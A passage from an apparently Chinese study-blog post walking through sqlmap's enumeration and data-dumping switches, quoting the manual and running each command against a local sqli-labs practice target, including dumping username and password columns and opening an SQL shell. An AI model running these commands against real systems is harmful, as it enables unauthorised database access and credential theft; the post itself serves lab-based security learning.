<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--dbs</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502213505074.png"
                      alt="image-20210502213505074"
                ></p>
<h3 id="枚举数据表"><a href="#枚举数据表" class="headerlink" title="枚举数据表"></a>枚举数据表</h3><blockquote>
<p>开关和选项：<code>--tables</code>，<code>--exclude-sysdbs</code> 和 <code>-D</code></p>
<p>如果当前会话用户对包含 DBMS 数据表信息的系统表有读取权限，则可以枚举出特定 DBMS 的数据表。</p>
<p>如果你不使用选项 <code>-D</code> 来指定数据库，则 sqlmap 将枚举所有 DBMS 数据库的表。</p>
<p>你还可以提供开关 <code>--exclude-sysdbs</code> 以排除所有的系统数据库。</p>
<p>注意，对于 Oracle，你需要提供 <code>TABLESPACE_NAME</code> 而不是数据库名称。</p>
</blockquote>
<p>单纯使用</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>

<p>使得所有数据表都被枚举，无法准确得到我们想要的数据表，故于可此使用<code>-D</code>来指定数据库</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="operator">-</span>D security <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502214029820.png"
                      alt="image-20210502214029820"
                ></p>
<p><code>--exclude-sysdbs</code>用于排除所有系统数据库</p>
<h3 id="枚举数据表的列名"><a href="#枚举数据表的列名" class="headerlink" title="枚举数据表的列名"></a>枚举数据表的列名</h3><blockquote>
<p>开关和选项：<code>--columns</code>，<code>-C</code>，<code>-T</code> 和 <code>-D</code></p>
<p>如果当前会话用户对包含 DBMS 数据表信息的系统表有读取权限，则可以枚举出特定数据表的列名。sqlmap 还将枚举所有列的数据类型。</p>
<p>此功能可使用选项 <code>-T</code> 来指定表名，还可以使用选项 <code>-D</code> 来指定数据库名称。如果未指定数据库名称，将使用当前的数据库名称。你还可以使用选项 <code>-C</code> 来指定要枚举的表列名。</p>
<p>针对 SQLite 目标的示例：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py <span class="operator">-</span>u &quot;http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1&quot; <span class="operator">-</span>\</span><br><span class="line"><span class="operator">-</span>columns <span class="operator">-</span>D testdb <span class="operator">-</span>T users <span class="operator">-</span>C name</span><br><span class="line">[...]</span><br><span class="line">Database: SQLite_masterdb</span><br><span class="line"><span class="keyword">Table</span>: users</span><br><span class="line">[<span class="number">3</span> columns]</span><br><span class="line"><span class="operator">+</span><span class="comment">---------+---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">Column</span>  <span class="operator">|</span> Type    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+---------+</span></span><br><span class="line"><span class="operator">|</span> id      <span class="operator">|</span> <span class="type">INTEGER</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> name    <span class="operator">|</span> TEXT    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> surname <span class="operator">|</span> TEXT    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+---------+</span></span><br></pre></td></tr></table></figure>

<p>注意，对于 PostgreSQL，你需要提供 <code>public</code> 或系统数据库的名称。这是因为不可能枚举其他数据库表，只能枚举出 Web 应用程序用户连接到的数据库模式下的表，它们总是以 <code>public</code> 为别名。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="operator">-</span>D security <span class="operator">-</span>T users <span class="comment">--columns</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502214612892.png"
                      alt="image-20210502214612892"
                ></p>
<h3 id="枚举-DBMS-模式"><a href="#枚举-DBMS-模式" class="headerlink" title="枚举 DBMS 模式"></a>枚举 DBMS 模式</h3><blockquote>
<p>开关：<code>--schema</code> 和 <code>--exclude-sysdbs</code></p>
<p>用户可以使用此开关获取 DBMS 模式。模式列表将包含所有数据库、表和列以及它们各自的类型。结合 <code>--exclude-sysdbs</code>，只有包含非系统数据库的模式才会被获取并显示出来。</p>
<p>针对 MySQL 目标的示例：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py <span class="operator">-</span>u &quot;http://192.168.48.130/sqlmap/mysql/get_int.php?id=1&quot; <span class="comment">--s\chema--batch --exclude-sysdbs</span></span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">Database: owasp10</span><br><span class="line"><span class="keyword">Table</span>: accounts</span><br><span class="line">[<span class="number">4</span> columns]</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">Column</span>      <span class="operator">|</span> Type    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+---------+</span></span><br><span class="line"><span class="operator">|</span> cid         <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysignature <span class="operator">|</span> text    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> password    <span class="operator">|</span> text    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> username    <span class="operator">|</span> text    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+---------+</span></span><br><span class="line"></span><br><span class="line">Database: owasp10</span><br><span class="line"><span class="keyword">Table</span>: blogs_table</span><br><span class="line">[<span class="number">4</span> columns]</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">Column</span>       <span class="operator">|</span> Type     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="type">date</span>         <span class="operator">|</span> datetime <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> blogger_name <span class="operator">|</span> text     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cid          <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>)  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> comment      <span class="operator">|</span> text     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+----------+</span></span><br><span class="line"></span><br><span class="line">Database: owasp10</span><br><span class="line"><span class="keyword">Table</span>: hitlog</span><br><span class="line">[<span class="number">6</span> columns]</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">Column</span>   <span class="operator">|</span> Type     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="type">date</span>     <span class="operator">|</span> datetime <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> browser  <span class="operator">|</span> text     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cid      <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>)  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> hostname <span class="operator">|</span> text     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ip       <span class="operator">|</span> text     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> referer  <span class="operator">|</span> text     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+</span></span><br><span class="line"></span><br><span class="line">Database: testdb</span><br><span class="line"><span class="keyword">Table</span>: users</span><br><span class="line">[<span class="number">3</span> columns]</span><br><span class="line"><span class="operator">+</span><span class="comment">---------+---------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">Column</span>  <span class="operator">|</span> Type          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+---------------+</span></span><br><span class="line"><span class="operator">|</span> id      <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>)       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> name    <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">500</span>)  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> surname <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">1000</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+---------------+</span></span><br><span class="line"></span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--schema --batch --exclude-sysdbs</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502215229748.png"
                      alt="image-20210502215229748"
                ></p>
<h3 id="获取数据表的数据条目数"><a href="#获取数据表的数据条目数" class="headerlink" title="获取数据表的数据条目数"></a>获取数据表的数据条目数</h3><blockquote>
<p>开关：<code>--count</code></p>
<p>如果用户想要在导出所需表数据之前知道表中的条目数，可以使用此开关。</p>
<p>针对 Microsoft SQL Server 目标的示例：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py <span class="operator">-</span>u &quot;http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1&quot;\</span><br><span class="line"> <span class="comment">--count -D testdb</span></span><br><span class="line">[...]</span><br><span class="line">Database: testdb</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">Table</span>          <span class="operator">|</span> Entries <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+---------+</span></span><br><span class="line"><span class="operator">|</span> dbo.users      <span class="operator">|</span> <span class="number">4</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> dbo.users_blob <span class="operator">|</span> <span class="number">2</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+---------+</span></span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--count -D security</span></span><br></pre></td></tr></table></figure>

<p>这里指定了数据库为”security”</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502215533633.png"
                      alt="image-20210502215533633"
                ></p>
<h3 id="导出数据表条目"><a href="#导出数据表条目" class="headerlink" title="导出数据表条目"></a>导出数据表条目</h3><blockquote>
<p>开关和选项：<code>--dump</code>，<code>-C</code>，<code>-T</code>，<code>-D</code>，<code>--start</code>，<code>--stop</code>，<code>--first</code>，<code>--last</code>，<code>--pivot-column</code> 和 <code>--where</code></p>
<p>如果当前会话用户对特定的数据表有读取权限，则可以导出数据表条目。</p>
<p>此功能依赖选项 <code>-T</code> 来指定表名，还可以用选项 <code>-D</code> 来指定数据库名称。如果提供了表名而不提供数据库名，则会使用当前的数据库。</p>
<p>针对 Firebird 目标的示例：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py <span class="operator">-</span>u &quot;http://192.168.136.131/sqlmap/firebird/get_int.php?id=1&quot;\</span><br><span class="line"> <span class="comment">--dump -T users</span></span><br><span class="line">[...]</span><br><span class="line">Database: Firebird_masterdb</span><br><span class="line"><span class="keyword">Table</span>: USERS</span><br><span class="line">[<span class="number">4</span> entries]</span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+------------+</span></span><br><span class="line"><span class="operator">|</span> ID <span class="operator">|</span> NAME   <span class="operator">|</span> SURNAME    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>  <span class="operator">|</span> luther <span class="operator">|</span> blisset    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2</span>  <span class="operator">|</span> fluffy <span class="operator">|</span> bunny      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">3</span>  <span class="operator">|</span> wu     <span class="operator">|</span> ming       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">4</span>  <span class="operator">|</span> <span class="keyword">NULL</span>   <span class="operator">|</span> nameisnull <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+------------+</span></span><br></pre></td></tr></table></figure>

<p>此开关也可用于导出指定数据库数据表的所有条目。你只需要提供开关 <code>--dump</code> 和选项 <code>-D</code>（不提供 <code>-T</code> 和 <code>-C</code>）。</p>
<p>你还可以使用选项 <code>-C</code> 提供一个以逗号分隔的特定列名列表来导出数据。</p>
<p>sqlmap 还能会为每个表生成相应的 CSV 格式文本文件用于存储导出的数据。你可以通过提供大于或等于 <strong>1</strong> 的详细程度级别来查看 sqlmap 所创建文件的绝对路径。</p>
<p>如果只是想导出特定范围的条目，可以提供选项 <code>--start</code> 和/或 <code>--stop</code>，以指定要从哪条数据开始导出和在哪条数据停止。例如，如果仅导出第一个条目，就在命令行中提供 <code>--stop 1</code>。或者如果你只想导出第二和第三个条目，就提供 <code>--start 1</code> <code>--stop 3</code>。</p>
<p>还可以使用选项 <code>--first</code> 和 <code>--last</code> 指定要导出的单个字符或特定范围的字符。例如，如果要导出条目的第三到第五个字符，就提供 <code>--first 3</code> <code>--last 5</code>。此功能仅适用于盲注技术，因为报错型注入（Error-based）和联合查询注入（UNION query-based）技术不管列数据条目的长度如何，发起的请求数量是完全相同的。</p>
<p>有些情况下（例如：对于 Microsoft SQL Server，Sybase 和 SAP MaxDB），由于缺少类似的机制，无法使用 <code>OFFSET m, n</code> 直接导出表的数据。在这种情况下，sqlmap 通过确定最适合的 <code>pivot</code> 列（具有唯一值的列，一般是主键），并使用该列检索其他列值，以此来导出数据。如果因为自动选择的 <code>pivot</code> 列不适用（例如：由于缺少表导出结果）而需要强制使用特定列，你可以使用选项 <code>--pivot-column</code>（例如： <code>--pivot-column=id</code>）。</p>
<p>如果要约束导出特定的列值（或范围），可以使用选项 <code>--where</code>。提供的逻辑运算将自动在 <code>WHERE</code> 子句内使用。例如，如果使用 <code>--where=&quot;id&gt;3&quot;</code>，那么只有 <code>id</code> 值大于 3 的行会被获取（通过将 <code>WHERE id&gt;3</code> 附加到使用的查询语句中）。</p>
<p>正如你可能已经注意到的，sqlmap 非常<strong>灵活</strong>：你可以将让其自动导出整个数据库表，或者非常精确地导出特定字符、列和范围的条目。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="operator">-</span>D security <span class="operator">-</span>T users <span class="operator">-</span>C password,username <span class="comment">--dump</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502220016913.png"
                      alt="image-20210502220016913"
                ></p>
<p><code>--dump</code>导出了数据库该数据表下所有条目</p>
<p><code>--start</code>或<code>--stop</code>用于控制输出的条目</p>
<p>​    <code>--stop 1</code>仅导出第一个条目</p>
<p>​    <code>--start 1 --stop 3</code>仅导出第二、第三个条目</p>
<p><code>--first 3 --last 5</code>导出条目的第三到第五个字符</p>
<h3 id="导出所有数据表条目"><a href="#导出所有数据表条目" class="headerlink" title="导出所有数据表条目"></a>导出所有数据表条目</h3><blockquote>
<p>开关：<code>--dump-all</code> 和 <code>--exclude-sysdbs</code></p>
<p>如果当前会话用户的读取权限允许，可以一次导出所有数据库表条目。</p>
<p>你还可以提供开关 <code>--exclude-sysdbs</code> 以排除所有的系统数据库。在这种情况下，sqlmap 只会导出当前用户的数据库表条目。</p>
<p>注意，对于 Microsoft SQL Server，<code>master</code> 数据库不被视为系统数据库，因为某些数据库管理员将其用作用户数据库。</p>
</blockquote>
<h3 id="搜索列，表或数据库"><a href="#搜索列，表或数据库" class="headerlink" title="搜索列，表或数据库"></a>搜索列，表或数据库</h3><blockquote>
<p>开关和选项：<code>--search</code>，<code>-C</code>，<code>-T</code>，<code>-D</code></p>
<p>此开关允许你<strong>在所有数据库中搜索特定的数据库名和表名，在特定的数据表中搜索特定的列名</strong>。</p>
<p>这非常有用，例如，要识别包含应用程序凭据的表，其中相关列的名称包含诸如 <em>name</em> 和 <em>pass</em> 这样的字符串。</p>
<p>开关 <code>--search</code> 需要与以下支持选项一起使用：</p>
<ul>
<li><code>-C</code>，附带以逗号分隔的列名列表来搜索整个 DBMS。</li>
<li><code>-T</code>，附带以逗号分隔的表名列表来搜索整个 DBMS。</li>
<li><code>-D</code>，附带以逗号分隔的数据库名列表来搜索整个 DBMS。</li>
</ul>
</blockquote>
<h3 id="运行自定义-SQL-语句"><a href="#运行自定义-SQL-语句" class="headerlink" title="运行自定义 SQL 语句"></a>运行自定义 SQL 语句</h3><blockquote>
<p>选项和开关：<code>--sql-query</code> 和 <code>--sql-shell</code></p>
<p>SQL 查询和 SQL shell 功能允许在 DBMS 上运行任意 SQL 语句。sqlmap 会自动解析提供的语句，确定哪种技术适合用于注入它，以及如何打包相应的 SQL payload。</p>
<p>如果查询是 <code>SELECT</code> 语句，sqlmap 将获取其输出。否则，如果 Web 应用程序的后端 DBMS 支持多语句，它将通过堆叠查询注入（Stacked queries）技术执行查询。注意，某些 Web 应用程序技术不支持特定 DBMS 上的堆叠查询。例如，当后端 DBMS 是 MySQL 时，PHP 不支持堆叠查询，但是当后端 DBMS 是 PostgreSQL 时，它是支持的。</p>
<p>针对 Microsoft SQL Server 2000 目标的示例：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py <span class="operator">-</span>u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; <span class="comment">--\</span></span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>query &quot;SELECT &#x27;foo&#x27;&quot; <span class="operator">-</span>v <span class="number">1</span></span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">[hh:mm:<span class="number">14</span>] [INFO] fetching <span class="keyword">SQL</span> <span class="keyword">SELECT</span> query output: <span class="string">&#x27;SELECT &#x27;</span>foo<span class="string">&#x27;&#x27;</span></span><br><span class="line">[hh:mm:<span class="number">14</span>] [INFO] retrieved: foo</span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;foo&#x27;</span>:    <span class="string">&#x27;foo&#x27;</span></span><br><span class="line"></span><br><span class="line">$ python sqlmap.py <span class="operator">-</span>u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; <span class="comment">--\</span></span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>query &quot;SELECT &#x27;foo&#x27;，&#x27;bar&#x27;&quot; <span class="operator">-</span>v <span class="number">2</span></span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">[hh:mm:<span class="number">50</span>] [INFO] fetching <span class="keyword">SQL</span> <span class="keyword">SELECT</span> query output: <span class="string">&#x27;SELECT &#x27;</span>foo<span class="string">&#x27;, &#x27;</span>bar<span class="string">&#x27;&#x27;</span></span><br><span class="line">[hh:mm:<span class="number">50</span>] [INFO] the <span class="keyword">SQL</span> query provided has more than a field. sqlmap will now</span><br><span class="line">unpack it <span class="keyword">into</span> <span class="keyword">distinct</span> queries <span class="keyword">to</span> be able <span class="keyword">to</span> retrieve the output even if we <span class="keyword">are</span></span><br><span class="line"> going blind</span><br><span class="line">[hh:mm:<span class="number">50</span>] [DEBUG] query: <span class="keyword">SELECT</span> ISNULL(<span class="built_in">CAST</span>((<span class="type">CHAR</span>(<span class="number">102</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">111</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">111</span>)) <span class="keyword">AS</span></span><br><span class="line"><span class="type">VARCHAR</span>(<span class="number">8000</span>)), (<span class="type">CHAR</span>(<span class="number">32</span>)))</span><br><span class="line">[hh:mm:<span class="number">50</span>] [INFO] retrieved: foo</span><br><span class="line">[hh:mm:<span class="number">50</span>] [DEBUG] performed <span class="number">27</span> queries <span class="keyword">in</span> <span class="number">0</span> seconds</span><br><span class="line">[hh:mm:<span class="number">50</span>] [DEBUG] query: <span class="keyword">SELECT</span> ISNULL(<span class="built_in">CAST</span>((<span class="type">CHAR</span>(<span class="number">98</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">97</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">114</span>)) <span class="keyword">AS</span> VA</span><br><span class="line">RCHAR(<span class="number">8000</span>)), (<span class="type">CHAR</span>(<span class="number">32</span>)))</span><br><span class="line">[hh:mm:<span class="number">50</span>] [INFO] retrieved: bar</span><br><span class="line">[hh:mm:<span class="number">50</span>] [DEBUG] performed <span class="number">27</span> queries <span class="keyword">in</span> <span class="number">0</span> seconds</span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>:    <span class="string">&#x27;foo, bar&#x27;</span></span><br></pre></td></tr></table></figure>

<p>如你所见，sqlmap 将提供的查询分解为两个不同的 <code>SELECT</code> 语句，然后单独获取每个查询的输出。</p>
<p>如果提供的查询是一个 <code>SELECT</code> 语句并包含一个 <code>FROM</code> 子句，sqlmap 会询问你是否可以返回多个条目。在这种情况下，它知道如何解析返回的结果，逐条计算指定的条目数量，并给出相关输出。</p>
<p>SQL shell 选项允许你以交互方式运行自己的 SQL 语句，就像直接连接到 DBMS 的 SQL 控制台。此功能还提供 TAB 补全和输入历史支持。</p>
</blockquote>
<h2 id="个人剧场"><a href="#个人剧场" class="headerlink" title="个人剧场"></a>个人剧场</h2><p>基本上，使用完整的单词作为命令的，使用<code>--</code></p>
<p>使用单个单词大写字母的，使用<code>-</code></p>
<p><code>--dbs</code>用于搜索数据库，<code>-D</code>则用于指定数据库</p>
<p><code>--tables</code>用于搜索数据表，<code>-T</code>则用于指定数据表</p>
<p><code>--columns</code>用于搜索字段，<code>-C</code>则用于指定字段</p>

      </div>
      
    </article>
    <!-- 上一篇文章和下一篇文章 -->
    
      <!-- 文章详情页的上一页和下一页 -->
<div class="post-nav">



  
  <div class="post-nav-prev post-nav-item">
    <div class="post-nav-img lazyload" data-original="/medias/4.jpg" style="background-size: cover; 
      background-position: center center;">
    </div>
    <a href="/2021/SQL-%5Bsqli-labs%5D%2023-38%20AdvInjections/" class="post-nav-link">
      <div class="title">
        <i class="fa fa-angle-left"></i> Prev:
        <div>SQL-[sqli-labs] 23-38 AdvInjections</div>
      </div>
      
      <!-- <div class="content">
        sqli-labs  SQL基础学习过程中的练习记录Lsee-23
      </div> -->
    </a>
  </div>



  
  <div class="post-nav-next post-nav-item">
    <div class="post-nav-img lazyload" data-original="/medias/5.jpg" style="background-size: cover; 
      background-position: center center;">
    </div>
    <a href="/2021/%E8%AE%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8EPHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="post-nav-link">
      <div class="title">
        Next: <i class="fa fa-angle-right"></i>
        <div>记一个简单的文件包含漏洞与PHP伪协议</div>
      </div>
      <!-- <div class="content">
        [极客大挑战 2019]Secret File1234567891011&lt;?php    highlight_fi
      </div> -->
    </a>
  </div>

</div>

    
    

    <!-- 打赏 -->
    

    <!-- 分享 -->
    
      <!-- https://github.com/overtrue/share.js -->
<!-- 文章详情页的分享 -->
<div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>

<script src="/js/shareJs/social-share.min.js"></script>
</script>

<style>
  .social-share {
    margin: 20px 0;
  }
</style>


    
    
    <!-- 评论 -->
    <!-- 评论 -->

  <div id="myComment">
    
      <!-- 来必力City版安装代码 -->
<div id="lv-container" data-id="city" data-uid="==" style="margin: 30px;">
  <script type="text/javascript">
     (function(d, s) {
         var j, e = d.getElementsByTagName(s)[0];
  
         if (typeof LivereTower === 'function') { return; }
  
         j = d.createElement(s);
         j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
         j.async = true;
  
         e.parentNode.insertBefore(j, e);
     })(document, 'script');
  </script>
  <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
  </div>
  <!-- City版安装代码已完成 -->
  
    
  </div>


  </div>

  <!-- 目录 -->
  <!-- 文章详情页右侧目录 -->

  <div class="toc-aside">
    <div class="toc-main">
      <div class="toc-aside-title">
        <i class="fa fa-list-ul" aria-hidden="true"></i><span>catalog</span>
        <div class="toc-open-close">catalog</div>
      </div>
      <div class="toc-content">
        <link href="/js/tocbot/tocbot.css" rel="stylesheet">
